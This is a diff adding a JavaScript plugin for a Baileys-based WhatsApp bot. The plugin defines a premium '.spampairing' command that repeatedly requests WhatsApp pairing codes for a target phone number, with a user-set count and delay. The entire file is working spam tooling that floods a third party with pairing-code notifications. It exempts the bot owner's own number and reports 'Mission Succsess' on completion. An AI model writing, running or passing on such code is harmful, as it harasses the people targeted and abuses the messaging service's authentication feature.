@@ -1,0 +1,50 @@
+import pino from "pino"
+import { useMultiFileAuthState, PHONENUMBER_MCC, } from "@adiwajshing/baileys";
+import { makeWASocket } from "../lib/simple.js";
+let handler = async(m, { text }) => {
+	
+	let { state } = await useMultiFileAuthState("tmp");
+	
+
+	let config = {
+		printQRInTerminal: false,
+		browser: ["Ubuntu", "Chrome", "20.0.04"],
+		auth: state
+	};
+	
+	
+	global.socket = makeWASocket(config)
+	
+	let [num, jum, slep] = text.split(' ')
+	let jumlah = jum ? jum : 1
+	let jeda = slep ? slep : 2000
+	
+	if (!num) return m.reply(`*Enter The Number Target!*\nExample Code: .spampairing nomor jumlah jeda\nExample: .spampairing 628xxx 10 2\n\n*[ N O T E ]*\nUntuk jeda, *1000* = 1 detik`)
+	if (jeda < 1000) return m.reply("Waktu jeda minimal 1000!")
+	if (num.includes('6283199346086')) return m.reply("Jangan Spam Ke Ownerku Paman!!!")
+	try {
+		await m.reply("_Sending Request..._")
+		await sleep(jeda) // Untuk mencegah Emrror
+		let phoneNumber = num.replace(/[^0-9]/g, '');
+		if (!Object.keys(PHONENUMBER_MCC)?.some(v => phoneNumber?.startsWith(v))) {
+			phoneNumber = num.replace(/[^0-9]/g, '');
+		};
+		for (let i = 0; i < jumlah; i++) { 
+			await socket?.requestPairingCode(phoneNumber)
+			await sleep(jeda)
+		};
+		await m.reply(`*Mission Succsess...*\n\n*• Target:* ${phoneNumber}\n*• Jumlah:* ${jum}\n*• Jeda:* ${slep} ms\n\n*[ N O T E ]*\nSegala Resiko Ditanggung Oleh Pengguna,\nJangan Disalah Gunakan Yaa Fiturnya!`)
+	} catch(x) {
+		m.reply(String(x))
+	}
+}
+
+handler.help = ["spampairing *[tag or number target]*"];
+handler.tags = ["main"];
+handler.command = /^(spampairing)$/i;
+handler.premium = true
+export default handler;
+
+function sleep(ms) {
+	return new Promise(resolve => setTimeout(resolve, ms));
+}
